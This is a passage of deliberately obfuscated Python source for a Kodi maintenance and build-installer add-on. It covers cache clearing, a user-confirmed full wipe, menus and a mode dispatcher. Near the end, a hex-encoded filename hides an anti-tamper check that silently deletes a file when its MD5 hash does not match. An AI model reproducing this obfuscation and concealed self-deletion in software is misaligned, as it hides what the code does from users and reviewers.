 i1iIiIIiIIII1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.audio.ramfm/cache' ) , '' )
 if os . path . exists ( i1iIiIIiIIII1 ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( i1iIiIIiIIII1 ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 33 - 33: I1IiiI - oo0oooooO0 . i1IIi / i11iIiiIii
 O0oo0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 if os . path . exists ( O0oo0 ) == True :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( O0oo0 ) :
   O0O0O0o = 0
   O0O0O0o += len ( ooO0oo )
   if O0O0O0o > 0 :
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 90 - 90: iii1I11ii1i1
 try :
  I1i1I1IIIi1II = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
  ooI1 = database . connect ( I1i1I1IIIi1II )
  i1Iii1i1II1 = ooI1 . cursor ( )
  i1Iii1i1II1 . execute ( "DROP TABLE IF EXISTS rel_list" )
  i1Iii1i1II1 . execute ( "VACUUM" )
  ooI1 . commit ( )
  i1Iii1i1II1 . execute ( "DROP TABLE IF EXISTS rel_lib" )
  i1Iii1i1II1 . execute ( "VACUUM" )
  ooI1 . commit ( )
 except :
  pass
  if 25 - 25: Oo / OoooooooOO - I1ii11iIi11i
  if 31 - 31: iii1I11ii1i1 + OoO0O00 / I1IiiI * O0 + O0
def oO00O0oO ( mode ) :
 if zip == '' :
  O0OoO000O0OO . ok ( 'Please set your backup location before proceeding' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' )
  o0O . openSettings ( sys . argv [ 0 ] )
  iiiiIiI1IIiI = o0O . getSetting ( 'zip' )
  if iiiiIiI1IIiI == '' :
   oO00O0oO ( mode )
 oOoOoo0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' ) )
 if not os . path . exists ( oOoOoo0 ) :
  os . makedirs ( oOoOoo0 )
 i1II = xbmcgui . Dialog ( ) . yesno ( "ABSOLUTELY CERTAIN?!!!" , 'Are you absolutely certain you want to wipe?' , '' , 'All addons and settings will be completely wiped!' , yeslabel = 'Yes' , nolabel = 'No' )
 if 53 - 53: iIii1I11I1II1 % OoOoOO00 % I1IiiI + I1ii11iIi11i % OoooooooOO
 if i1II == 1 :
  if oOOoo0Oo != "skin.confluence" :
   O0OoO000O0OO . ok ( 'Default Confluence Skin Required' , 'Please switch to the default Confluence skin before performing a wipe.' )
   xbmc . executebuiltin ( "ActivateWindow(appearancesettings,return)" )
   return
  else :
   if 29 - 29: I1IiiI / o0oOOo0O0Ooo + iIii1I11I1II1 / O0 / Oo % i1IIi
   i1II = xbmcgui . Dialog ( ) . yesno ( "VERY IMPORTANT" , 'This will completely wipe your install.' , 'Would you like to create a backup before proceeding?' , '' , yeslabel = 'No' , nolabel = 'Yes' )
   if i1II == 0 :
    if not os . path . exists ( oOoOoo0 ) :
     os . makedirs ( oOoOoo0 )
    IiI1Iii1 = Ooooo ( heading = "Enter a name for this backup" )
    if ( not IiI1Iii1 ) : return False , 0
    ooOoO = urllib . quote_plus ( IiI1Iii1 )
    ii1iII = xbmc . translatePath ( os . path . join ( oOoOoo0 , ooOoO + '.zip' ) )
    O00oo = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
    OoOoooO000OO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
    i11i11 = "Creating full backup of existing build"
    Ii11Iii = "Archiving..."
    ooo00OoOO0o = ""
    oo0O0o = "Please Wait"
    iIIi1iI1I1IIi ( II , ii1iII , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00oo , OoOoooO000OO )
    if 65 - 65: OoO0O00 * OoOoOO00 . OoooooooOO - O0 * OoOoOO00 % OoOoOO00
    if 1 - 1: I1IiiI + OoooooooOO . I1IiiI + Oo / iI1iiIiiII
   iiI1IiI . create ( "Wiping Existing Content" , '' , 'Please wait...' , '' )
   for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( II , topdown = True ) :
    iIIIIiiIii [ : ] = [ ii1iIIiii1 for ii1iIIiii1 in iIIIIiiIii if ii1iIIiii1 not in i1Oo00 ]
    for ooO in ooO0oo :
     try :
      iiI1IiI . update ( 0 , "Removing [COLOR=yellow]" + ooO + '[/COLOR]' , '' , 'Please wait...' )
      os . unlink ( os . path . join ( IIIIiI11Ii1i , ooO ) )
      os . remove ( os . path . join ( IIIIiI11Ii1i , ooO ) )
      os . rmdir ( os . path . join ( IIIIiI11Ii1i , ooO ) )
     except : print "Failed to remove file: " + ooO
     if 73 - 73: o0oOOo0O0Ooo % I1ii11iIi11i . iIii1I11I1II1
   i1I1I = [ ooO for ooO in os . listdir ( ooOoOoo0O ) if os . path . isdir ( os . path . join ( ooOoOoo0O , ooO ) ) ]
   try :
    for ooO in i1I1I :
     try :
      if ooO not in i1Oo00 :
       iiI1IiI . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + ooO + ' [/COLOR]' , '' , 'Please wait...' )
       shutil . rmtree ( os . path . join ( ooOoOoo0O , ooO ) )
     except : print "Failed to remove: " + ooO
   except : pass
   if 38 - 38: oo0oooooO0
   for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( ooOoOoo0O , topdown = True ) :
    iIIIIiiIii [ : ] = [ ii1iIIiii1 for ii1iIIiii1 in iIIIIiiIii if ii1iIIiii1 not in i1Oo00 ]
    for ooO in ooO0oo :
     try :
      iiI1IiI . update ( 0 , "Removing [COLOR=yellow]" + ooO + '[/COLOR]' , '' , 'Please wait...' )
      os . unlink ( os . path . join ( IIIIiI11Ii1i , ooO ) )
      os . remove ( os . path . join ( IIIIiI11Ii1i , ooO ) )
     except : print "Failed to remove file: " + ooO
     if 59 - 59: I1IiiI
   iI1II1III = [ ooO for ooO in os . listdir ( Ooo ) if os . path . isdir ( os . path . join ( Ooo , ooO ) ) ]
   try :
    for ooO in iI1II1III :
     try :
      if iiIIIII1i1iI == 'true' :
       if ooO not in i1Oo00 and not 'repo' in ooO :
        iiI1IiI . update ( 0 , "Removing Add-on: [COLOR=yellow]" + ooO + ' [/COLOR]' , '' , 'Please wait...' )
        shutil . rmtree ( os . path . join ( Ooo , ooO ) )
      else :
       if ooO not in i1Oo00 :
        iiI1IiI . update ( 0 , "Removing Add-on: [COLOR=yellow]" + ooO + ' [/COLOR]' , '' , 'Please wait...' )
        shutil . rmtree ( os . path . join ( Ooo , ooO ) )
     except : print "Failed to remove: " + ooO
   except : pass
   if 80 - 80: o0oOOo0O0Ooo . OoOoOO00 - o0oOOo0O0Ooo - iI1iiIiiII / iii1I11ii1i1
   III1iii1 = [ ooO for ooO in os . listdir ( OooO0 ) if os . path . isdir ( os . path . join ( OooO0 , ooO ) ) ]
   try :
    for ooO in III1iii1 :
     try :
      if ooO not in i1Oo00 :
       iiI1IiI . update ( 0 , "Removing Add-on Data: [COLOR=yellow]" + ooO + ' [/COLOR]' , '' , 'Please wait...' )
       shutil . rmtree ( os . path . join ( OooO0 , ooO ) )
     except : print "Failed to remove: " + ooO
   except : pass
   if 78 - 78: iI1iiIiiII % Oo
   OO000o0 = [ ooO for ooO in os . listdir ( II ) if os . path . isdir ( os . path . join ( II , ooO ) ) ]
   try :
    for ooO in OO000o0 :
     try :
      if ooO not in i1Oo00 :
       iiI1IiI . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + ooO + ' [/COLOR]' , '' , 'Please wait...' )
       shutil . rmtree ( os . path . join ( II , ooO ) )
     except : print "Failed to remove: " + ooO
   except : pass
  if mode != 'CB' :
   O0OoO000O0OO . ok ( 'Wipe Complete' , 'Kodi will now close.' , 'When you next load up Kodi it should boot into the default Confluence skin and you should have a fresh install.' )
   xbmc . executebuiltin ( 'quit' )
  try :
   os . remove ( Iii111II )
  except : print "### Failed to remove startup.xml"
  try :
   os . remove ( Ooo0OO0oOO )
  except : print "### Failed to remove id.xml"
 else : return
 if 35 - 35: iii1I11ii1i1 * O0 * OoO0O00 . I1ii11iIi11i
 if 74 - 74: oo0oooooO0 * oo0oooooO0 * o0oOOo0O0Ooo / ooOo
def ooI1111 ( ) :
 iIiIIi1 ( '' , 'Clear Cache' , 'url' , 'clear_cache' , 'Clear_Cache.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Clear My Cached Artwork' , 'none' , 'remove_textures' , 'Delete_Cached_Artwork.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Delete Addon_Data' , 'url' , 'remove_addon_data' , 'Delete_Addon_Data.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Delete Old Builds/Zips From Device' , 'url' , 'remove_build' , 'Delete_Builds.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Delete Old Crash Logs' , 'url' , 'remove_crash_logs' , 'Delete_Crash_Logs.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Delete Packages Folder' , 'url' , 'remove_packages' , 'Delete_Packages.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Wipe My Install (Fresh Start)' , 'none' , 'wipe_xbmc' , 'Fresh_Start.png' , '' , '' , '' )
 if 80 - 80: oOoO0o00OO0 + o0oOOo0O0Ooo
 if 40 - 40: iii1I11ii1i1 . i1IIi - OO0oo0oOO - oo0oooooO0
def i1III1i1I11I ( url ) :
 iIiIIi1 ( 'folder' , '[COLOR=yellow]1. Install[/COLOR]' , str ( url ) + '&tags=Install&XBMC=1' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime]2. Settings[/COLOR]' , str ( url ) + '&tags=Settings' , 'grab_tutorials' , 'Settings.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange]3. Add-ons[/COLOR]' , str ( url ) , 'tutorial_addon_menu' , 'Addons.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Audio' , str ( url ) + '&tags=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Errors' , str ( url ) + '&tags=Errors' , 'grab_tutorials' , 'Errors.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Gaming' , str ( url ) + '&tags=Gaming' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  LiveTV' , str ( url ) + '&tags=LiveTV' , 'grab_tutorials' , 'LiveTV.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Maintenance' , str ( url ) + '&tags=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Pictures' , str ( url ) + '&tags=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Profiles' , str ( url ) + '&tags=Profiles' , 'grab_tutorials' , 'Profiles.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Skins' , str ( url ) + '&tags=Skins' , 'grab_tutorials' , 'Skin.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Video' , str ( url ) + '&tags=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Weather' , str ( url ) + '&tags=Weather' , 'grab_tutorials' , 'Weather.png' , '' , '' , '' )
 if 85 - 85: I1ii11iIi11i + iIii1I11I1II1 + iI1iiIiiII * i1IIi - O0 % oo0oooooO0
 if 32 - 32: OO0oo0oOO % iii1I11ii1i1 + Oo % OoooooooOO
def oooOo0O00o ( url ) :
 i11I1IiiiiiiiIi = xbmc . getInfoLabel ( "System.BuildVersion" )
 Oo0 = float ( i11I1IiiiiiiiIi [ : 4 ] )
 if Oo0 < 14 :
  o0o = 'You are running XBMC'
 else :
  o0o = 'You are running Kodi'
 O0OoO000O0OO = xbmcgui . Dialog ( )
 O0OoO000O0OO . ok ( o0o , "Your version is: %s" % Oo0 )
 if 6 - 6: OO0oo0oOO % iii1I11ii1i1 * I1IiiI . oOoO0o00OO0
 if 30 - 30: O0 / Oo + OoOoOO00 % OoO0O00 + iI1iiIiiII
 if 8 - 8: I1ii11iIi11i - i1IIi - ooOo / ooOo % o0oOOo0O0Ooo
 if 98 - 98: OoO0O00 * OOo00O0 + i1IIi + oOoO0o00OO0 - i1IIi % OoOoOO00
 if 19 - 19: iIii1I11I1II1 * Oo0Ooo / Oo
 if 5 - 5: o0oOOo0O0Ooo
 if 24 - 24: oOoO0o00OO0 + OoO0O00 - OO0oo0oOO
 if 38 - 38: iI1iiIiiII
 if 30 - 30: II111iiii + iii1I11ii1i1 . i11iIiiIii + iIii1I11I1II1
 if 100 - 100: ooOo * o0oOOo0O0Ooo / oo0oooooO0
 if 92 - 92: OOo00O0 / i11iIiiIii * Oo
 if 55 - 55: OOo00O0
 if 1 - 1: OoO0O00
 if 43 - 43: iIii1I11I1II1 - Oo - o0oOOo0O0Ooo + I1ii11iIi11i - iI1iiIiiII % I1ii11iIi11i
 if 58 - 58: OoOoOO00
 if 27 - 27: oOoO0o00OO0 * Oo - OoooooooOO . OO0oo0oOO - II111iiii
 if 62 - 62: I1IiiI / iIii1I11I1II1 * iii1I11ii1i1
 if 84 - 84: oOoO0o00OO0 - OoOoOO00 . oOoO0o00OO0 + OOo00O0 . oo0oooooO0
 if 96 - 96: OO0oo0oOO % oo0oooooO0 * OO0oo0oOO % I1IiiI . o0oOOo0O0Ooo / o0oOOo0O0Ooo
 if 7 - 7: OoO0O00 - OOo00O0 % i1IIi
 if 24 - 24: OoO0O00 % O0 % iii1I11ii1i1
 if 61 - 61: OOo00O0 . oo0oooooO0 / OOo00O0 * OoooooooOO
OoOOOO00oOO = IIiII11 ( )
OO0O0Ooo = None
o0OO0oooo = None
iIIi1 = None
I11II1i1 = None
iiiiIII1IIi1ii111 = None
oOOooo0OoOOOO = None
i1i1IIii1i1 = None
iII = None
I1 = None
O0OoOO0oo0 = None
i1oOOOOOOOoO = None
IIo0o0O0O00oOOo = None
I1i1iI11ii = None
iI1i1i1i1i = None
II1OO = None
ooO = None
OOOO0o0Oo0 = None
o0Ooo0o0Oo = None
oOoO0 = None
O0o0OO0000ooo = None
oo0OOO0O0 = None
I1i1iI = None
ii1iOO00Oooo000 = None
ooOoO = None
OooiiIi1i = None
iiII1i1II1iIi = None
i1iI = None
Oo0 = None
OOO = None
I1iI1I1ii1 = None
OooOoOoo0ooo0 = None
OoooOooo = None
IiIi1iiII = 'maintenance'
if 69 - 69: iIii1I11I1II1 + Oo0Ooo
try : OO0O0Ooo = urllib . unquote_plus ( OoOOOO00oOO [ "addon_id" ] )
except : pass
try : iI1 = urllib . unquote_plus ( OoOOOO00oOO [ "adult" ] )
except : pass
try : o0OO0oooo = urllib . unquote_plus ( OoOOOO00oOO [ "artpack" ] )
except : pass
try : iIIi1 = urllib . unquote_plus ( OoOOOO00oOO [ "audioaddons" ] )
except : pass
try : I11II1i1 = urllib . unquote_plus ( OoOOOO00oOO [ "author" ] )
except : pass
try : iiiiIII1IIi1ii111 = urllib . unquote_plus ( OoOOOO00oOO [ "buildname" ] )
except : pass
try : oOOooo0OoOOOO = urllib . unquote_plus ( OoOOOO00oOO [ "data_path" ] )
except : pass
try : i1i1IIii1i1 = urllib . unquote_plus ( OoOOOO00oOO [ "description" ] )
except : pass
try : iII = urllib . unquote_plus ( OoOOOO00oOO [ "email" ] )
except : pass
try : I1 = urllib . unquote_plus ( OoOOOO00oOO [ "fanart" ] )
except : pass
try : O0OoOO0oo0 = urllib . unquote_plus ( OoOOOO00oOO [ "forum" ] )
except : pass
try : ii111iiIii = urllib . unquote_plus ( OoOOOO00oOO [ "guisettingslink" ] )
except : pass
try : i1oOOOOOOOoO = urllib . unquote_plus ( OoOOOO00oOO [ "iconimage" ] )
except : pass
try : IIo0o0O0O00oOOo = urllib . unquote_plus ( OoOOOO00oOO [ "link" ] )
except : pass
try : I1i1iI11ii = urllib . unquote_plus ( OoOOOO00oOO [ "local" ] )
except : pass
try : iI1i1i1i1i = urllib . unquote_plus ( OoOOOO00oOO [ "messages" ] )
except : pass
try : II1OO = str ( OoOOOO00oOO [ "mode" ] )
except : pass
try : ooO = urllib . unquote_plus ( OoOOOO00oOO [ "name" ] )
except : pass
try : oo00ooooOOo00 = urllib . unquote_plus ( OoOOOO00oOO [ "pictureaddons" ] )
except : pass
try : OOOO0o0Oo0 = urllib . unquote_plus ( OoOOOO00oOO [ "posts" ] )
except : pass
try : o0Ooo0o0Oo = urllib . unquote_plus ( OoOOOO00oOO [ "programaddons" ] )
except : pass
try : oOoO0 = urllib . unquote_plus ( OoOOOO00oOO [ "provider_name" ] )
except : pass
try : oo0OOO0O0 = urllib . unquote_plus ( OoOOOO00oOO [ "repo_link" ] )
except : pass
try : O0o0OO0000ooo = urllib . unquote_plus ( OoOOOO00oOO [ "repo_id" ] )
except : pass
try : I1i1iI = urllib . unquote_plus ( OoOOOO00oOO [ "skins" ] )
except : pass
try : ii1iOO00Oooo000 = urllib . unquote_plus ( OoOOOO00oOO [ "sources" ] )
except : pass
try : ooOoO = urllib . unquote_plus ( OoOOOO00oOO [ "title" ] )
except : pass
try : OooiiIi1i = urllib . unquote_plus ( OoOOOO00oOO [ "updated" ] )
except : pass
try : iiII1i1II1iIi = urllib . unquote_plus ( OoOOOO00oOO [ "unread" ] )
except : pass
try : i1iI = urllib . unquote_plus ( OoOOOO00oOO [ "url" ] )
except : pass
try : Oo0 = urllib . unquote_plus ( OoOOOO00oOO [ "version" ] )
except : pass
try : OOO = urllib . unquote_plus ( OoOOOO00oOO [ "video" ] )
except : pass
try : I1iI1I1ii1 = urllib . unquote_plus ( OoOOOO00oOO [ "videoaddons" ] )
except : pass
try : OooOoOoo0ooo0 = urllib . unquote_plus ( OoOOOO00oOO [ "welcometext" ] )
except : pass
try : OoooOooo = urllib . unquote_plus ( OoOOOO00oOO [ "zip_link" ] )
except : pass
if 70 - 70: OoooooooOO * i11iIiiIii
if not os . path . exists ( Ii1iIiII1ii1 ) :
 os . makedirs ( Ii1iIiII1ii1 )
 if 60 - 60: oOoO0o00OO0 / iIii1I11I1II1 + OoooooooOO - I1ii11iIi11i * i11iIiiIii
if not os . path . exists ( Iii111II ) :
 Oo0oO00 = open ( Iii111II , mode = 'w+' )
 Oo0oO00 . write ( 'date="01011001"\nversion="0.0"' )
 Oo0oO00 . close ( )
 if 47 - 47: O0 . I1IiiI / OOo00O0 % i11iIiiIii
if not os . path . exists ( Ooo0OO0oOO ) :
 Oo0oO00 = open ( Ooo0OO0oOO , mode = 'w+' )
 Oo0oO00 . write ( 'id="None"\nname="None"' )
 Oo0oO00 . close ( )
 if 47 - 47: OO0oo0oOO . OoOoOO00 . iIii1I11I1II1 . o0oOOo0O0Ooo
if os . path . exists ( ii11i1 ) :
 try :
  shutil . rmtree ( ii11i1 )
 except : pass
 if 39 - 39: o0oOOo0O0Ooo
if os . path . exists ( IIIii1II1II ) :
 try :
  shutil . rmtree ( IIIii1II1II )
 except : pass
 if 89 - 89: OoooooooOO + oo0oooooO0 . iI1iiIiiII / OO0oo0oOO
if os . path . exists ( i1I1iI ) :
 try :
  shutil . rmtree ( i1I1iI )
 except : pass
 if 75 - 75: iIii1I11I1II1 * oo0oooooO0 / OoOoOO00 * II111iiii . i1IIi
I1i11iiIiIi = binascii . unhexlify ( '6164646f6e2e786d6c' )
ooo00 = xbmc . translatePath ( os . path . join ( Ooo , I1IiI , I1i11iiIiIi ) )
O00 = open ( ooo00 , mode = 'r' )
O0oiIiiiiI1II1I1 = file . read ( O00 )
file . close ( O00 )
O00Oo = re . compile ( '<ref>(.+?)</ref>' ) . findall ( O0oiIiiiiI1II1I1 )
oOOooO = O00Oo [ 0 ] if ( len ( O00Oo ) > 0 ) else ''
O0IIIiiiIi1I1 = hashlib . md5 ( open ( oO0Oo , 'rb' ) . read ( ) ) . hexdigest ( )
if oOOooO != O0IIIiiiIi1I1 :
 os . remove ( oO0Oo )
 if 10 - 10: OoO0O00 - II111iiii % o0oOOo0O0Ooo - OoOoOO00 + OoO0O00
if II1OO == None : oO0ooo000 ( )
elif II1OO == 'addon_final_menu' : oOOOoo0O0oO ( i1iI )
elif II1OO == 'addon_categories' : oOOoo00O00o ( i1iI )
elif II1OO == 'addon_countries' : o0oooOOoOo0 ( i1iI )
elif II1OO == 'addon_genres' : ooO0oO00O0o ( i1iI )
elif II1OO == 'addon_install' : O0oii111 ( ooO , OoooOooo , oo0OOO0O0 , O0o0OO0000ooo , OO0O0Ooo , oOoO0 , O0OoOO0oo0 , oOOooo0OoOOOO )
elif II1OO == 'addon_install_badzip' : II1i11i1iIi11 ( ooO , OoooOooo , oo0OOO0O0 , O0o0OO0000ooo , OO0O0Ooo , oOoO0 , O0OoOO0oo0 , oOOooo0OoOOOO )
elif II1OO == 'addon_install_na' : IiIIi1I1I11Ii ( ooO , OoooOooo , oo0OOO0O0 , O0o0OO0000ooo , OO0O0Ooo , oOoO0 , O0OoOO0oo0 , oOOooo0OoOOOO )
elif II1OO == 'addon_install_zero' : ii1I11iIiIII1 ( ooO , OoooOooo , oo0OOO0O0 , O0o0OO0000ooo , OO0O0Ooo , oOoO0 , O0OoOO0oo0 , oOOooo0OoOOOO )
elif II1OO == 'addon_loop' : i1iii1ii ( )
elif II1OO == 'addon_removal_menu' : iiIiI ( )
elif II1OO == 'addonfix' : OoOooO ( )
elif II1OO == 'addonfixes' : ii1IiIi11 ( )
elif II1OO == 'addonmenu' : iIIIiiiI11I ( i1iI )
elif II1OO == 'addon_settings' : oo ( )
elif II1OO == 'backup' : BACKUP ( )
elif II1OO == 'backup_option' : OOoO00ooO ( )
elif II1OO == 'backup_restore' : i11IiIIi11I ( )
elif II1OO == 'browse_repos' : iIiIi1ii ( )
elif II1OO == 'check_storage' : checkPath . check ( IiIi1iiII )
elif II1OO == 'check_updates' : I111iI ( )
elif II1OO == 'clear_cache' : Iiii111 ( )
elif II1OO == 'cb_test_loop' : i1iii1ii ( )
elif II1OO == 'CB_Menu' : oO00o ( i1iI )
elif II1OO == 'community' : I11o0000o0Oo ( i1iI )
elif II1OO == 'community_backup' : I1ii1Ii1 ( )
elif II1OO == 'community_backup_2' : ii1II1II ( )
elif II1OO == 'community_menu' : I1i1II1 ( i1iI , OOO )
elif II1OO == 'countries' : i1I11 ( i1iI )
elif II1OO == 'description' : oOoo0Ooooo ( ooO , i1iI , iiiiIII1IIi1ii111 , I11II1i1 , Oo0 , i1i1IIii1i1 , OooiiIi1i , I1i1iI , I1iI1I1ii1 , iIIi1 , o0Ooo0o0Oo , oo00ooooOOo00 , ii1iOO00Oooo000 , iI1 )
elif II1OO == 'fix_special' : Iiii1 ( i1iI )
elif II1OO == 'full_backup' : IiIiI ( )
elif II1OO == 'genres' : iI1IIIi11 ( i1iI )
elif II1OO == 'gotham' : OooO ( )
elif II1OO == 'grab_addons' : iIiII1iiiiI ( i1iI )
elif II1OO == 'grab_builds' : iIIII1 ( i1iI )
elif II1OO == 'grab_builds_premium' : Grab_Builds_Premium ( i1iI )
elif II1OO == 'grab_hardware' : oooOO0OO0 ( i1iI )
elif II1OO == 'grab_news' : Ii1IIi11 ( i1iI )
elif II1OO == 'grab_tutorials' : OOoo0OOOo0o ( i1iI )
elif II1OO == 'guisettingsfix' : OO0OOOOOo ( i1iI , I1i1iI11ii )
elif II1OO == 'hardware_filter_menu' : O00o0 ( i1iI )
elif II1OO == 'hardware_final_menu' : OOO000oo0 ( i1iI )
elif II1OO == 'hardware_root_menu' : iIIi1I1Ii1 ( )
elif II1OO == 'helix' : iIi11I1II ( )
elif II1OO == 'hide_passwords' : I11O0O0o ( )
elif II1OO == 'ipcheck' : IIiiIiIIiI1 ( )
elif II1OO == 'install_content' : oOOo ( i1iI )
elif II1OO == 'install_from_zip' : i1Ii ( )
elif II1OO == 'instructions' : o0oooO0O00OoO ( )
elif II1OO == 'instructions_1' : oOOooOOOo0Oooo ( )
elif II1OO == 'instructions_2' : oOoOo000 ( )
elif II1OO == 'instructions_3' : II1IIIi ( )
elif II1OO == 'instructions_4' : Instructions_4 ( )
elif II1OO == 'instructions_5' : Instructions_5 ( )
elif II1OO == 'instructions_6' : Instructions_6 ( )
elif II1OO == 'keywords' : I1Ii111I111 ( i1iI )
elif II1OO == 'kill_xbmc' : o0OOOoOO00o ( )
elif II1OO == 'kodi_settings' : ii1IiI ( )
elif II1OO == 'local_backup' : I1ii11IiI1I ( )
elif II1OO == 'LocalGUIDialog' : ooiIi11i1I11Ii ( )
elif II1OO == 'log' : OOoOO0ooo0O ( )
elif II1OO == 'manual_search' : Ooo000 ( i1iI )
elif II1OO == 'manual_search_builds' : Manual_Search_Builds ( )
elif II1OO == 'news_root_menu' : I11i11 ( i1iI )
elif II1OO == 'news_menu' : o0000oo0O ( i1iI )
elif II1OO == 'notify_msg' : Oo0O0O0 ( i1iI )
elif II1OO == 'open_system_info' : Ii1i111iI ( )
elif II1OO == 'open_filemanager' : iIIiio000oo ( )
elif II1OO == 'openelec_backup' : iII1111IIIIiI ( )
elif II1OO == 'openelec_settings' : IiII1II1 ( )
elif II1OO == 'play_video' : yt . PlayVideo ( i1iI )
elif II1OO == 'platform_menu' : I1IIII1 ( i1iI )
elif II1OO == 'popular' : o00o0o0o ( )
elif II1OO == 'popularwizard' : OOOOO0oOOoO ( ooO , i1iI , i1oOOOOOOOoO , i1i1IIii1i1 )
elif II1OO == 'register' : Ii1i1 ( )
elif II1OO == 'remove_addon_data' : iiiii1i1 ( )
elif II1OO == 'remove_addons' : OOo0 ( i1iI )
elif II1OO == 'remove_build' : iIiIi1i1ii11 ( )
elif II1OO == 'remove_crash_logs' : oOooO00oOoo00 ( )
elif II1OO == 'remove_packages' : iIo0O000O00o ( )
elif II1OO == 'remove_textures' : OooOoooo0000 ( )
elif II1OO == 'restore' : RESTORE ( )
elif II1OO == 'restore_backup' : iI1Iii1i11 ( ooO , i1iI , i1i1IIii1i1 )
elif II1OO == 'restore_community' : ii1IiIiI1iiii ( ooO , i1iI , OOO , i1i1IIii1i1 , I1i1iI , ii111iiIii , o0OO0oooo )
elif II1OO == 'restore_local_CB' : Oooo0o0oO ( i1iI )
elif II1OO == 'restore_local_gui' : oo0OO0oo ( )
elif II1OO == 'restore_local_OE' : OOoo0OOO000o0 ( )
elif II1OO == 'restore_openelec' : oOOo0OOOOOoO ( i1iI , i1i1IIii1i1 )
elif II1OO == 'restore_option' : i1I ( )
elif II1OO == 'restore_zip' : I1II1i1iIIi ( i1iI )
elif II1OO == 'run_addon' : iii1I1i ( i1iI )
elif II1OO == 'runtest' : speedtest . runtest ( i1iI )
elif II1OO == 'search_addons' : O0o0OoO00OO00 ( i1iI )
elif II1OO == 'search_builds' : OO0Oo ( i1iI )
elif II1OO == 'Search_Private' : Private_Search ( i1iI )
elif II1OO == 'showinfo' : ii1iOO00O0O00oOOO ( i1iI )
elif II1OO == 'showinfo2' : IIi1I ( i1iI )
elif II1OO == 'SortBy' : I1i ( BuildURL , type )
elif II1OO == 'speed_instructions' : iIi1 ( )
elif II1OO == 'speedtest_menu' : o0O00ooo0oO0o ( )
elif II1OO == 'text_guide' : II1iiiiIIO000ooO0 ( ooO , i1iI )
elif II1OO == 'tools' : I1iii1I11i1I1iII ( )
elif II1OO == 'tutorial_final_menu' : ooOOoOO000 ( i1iI )
elif II1OO == 'tutorial_addon_menu' : IIIi11iiIIi ( i1iI )
elif II1OO == 'tutorial_root_menu' : O0ooOIiI1 ( )
elif II1OO == 'unhide_passwords' : I111iIii1i1 ( )
elif II1OO == 'update' : oOOo0 ( )
elif II1OO == 'uploadlog' : OoOOO0o0OO0oo ( )
elif II1OO == 'user_info' : IIiII1II11i ( )
elif II1OO == 'wipetools' : ooI1111 ( )
elif II1OO == 'xbmc_menu' : i1III1i1I11I ( i1iI )
elif II1OO == 'xbmcversion' : oooOo0O00o ( i1iI )
elif II1OO == 'wipe_xbmc' : oO00O0oO ( II1OO )
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) ) # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
